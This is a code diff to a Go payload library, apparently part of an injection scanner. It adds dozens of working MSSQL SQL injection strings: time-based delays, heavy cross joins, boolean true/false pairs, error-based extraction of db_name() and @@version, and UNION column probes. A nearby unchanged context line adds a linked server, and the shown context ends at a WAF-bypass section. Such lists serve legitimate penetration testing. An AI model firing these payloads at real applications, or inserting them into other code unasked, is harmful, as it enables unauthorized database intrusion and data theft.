@@ -130,6 +130,55 @@ var MSSQL = PayloadGroup{
 		{Type: "deep", Content: "'; EXEC sp_addlinkedserver 'target', 'SQL Server'--"},
 
 		// ═══════════════════════════════════════════
+		// ADVANCED TIME-BASED
+		// ═══════════════════════════════════════════
+		{Type: "time", Content: "1' WAITFOR DELAY '0:0:5'--"},
+		{Type: "time", Content: "1\" WAITFOR DELAY '0:0:5'--"},
+		{Type: "time", Content: "1') WAITFOR DELAY '0:0:5'--"},
+		{Type: "time", Content: "1\") WAITFOR DELAY '0:0:5'--"},
+		{Type: "time", Content: "1' WAITFOR DELAY '00:00:05'--"},
+		{Type: "time", Content: "1' WAITFOR DELAY '0:0:10'--"},
+		{Type: "time", Content: "1' WAITFOR DELAY '0:0:3'--"},
+		{Type: "time", Content: "1'; WAITFOR DELAY '0:0:5'--"},
+		{Type: "time", Content: "1'; WAITFOR DELAY '00:00:05'--"},
+		{Type: "time", Content: "1' AND WAITFOR DELAY '0:0:5'--"},
+		{Type: "time", Content: "1' AND WAITFOR DELAY '00:00:05'--"},
+		{Type: "time", Content: "1' OR WAITFOR DELAY '0:0:5'--"},
+		{Type: "time", Content: "1' OR WAITFOR DELAY '00:00:05'--"},
+		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM sysobjects a, sysobjects b, sysobjects c)--"},
+		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM syscolumns a, syscolumns b, syscolumns c)--"},
+		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM sysobjects a, sysobjects b, sysobjects c, sysobjects d) x)--"},
+
+		// ADVANCED BOOLEAN
+		// ═══════════════════════════════════════════
+		{Type: "boolean", Content: "1' AND 1=1 AND '1'='1", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2 AND '1'='1", Expected: "false"},
+		{Type: "boolean", Content: "1' AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1') AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1\" AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1\" AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1\") AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1\") AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "1' AND 1=1-- -", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2-- -", Expected: "false"},
+
+		// ADVANCED ERROR-BASED
+		// ═══════════════════════════════════════════
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT db_name()),':',FLOOR(RAND()*2))x FROM sysobjects GROUP BY x) a)--"},
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,COUNT(*) FROM sysobjects GROUP BY CONCAT((SELECT db_name()),FLOOR(RAND()*2))) a)--"},
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT @@version),':',FLOOR(RAND()*2))x FROM sysobjects GROUP BY x) a)--"},
+
+		// ADVANCED UNION
+		// ═══════════════════════════════════════════
+		{Type: "union", Content: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"},
+		{Type: "union", Content: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--"},
+		{Type: "union", Content: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--"},
+		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"},
+		{Type: "union", Content: "1') UNION SELECT 1,2,3--"},
+		{Type: "union", Content: "1\") UNION SELECT 1,2,3--"},
+
 		// WAF BYPASS
 		// ═══════════════════════════════════════════
 		{Type: "bypass", Content: "'%20OR%201=1--"},
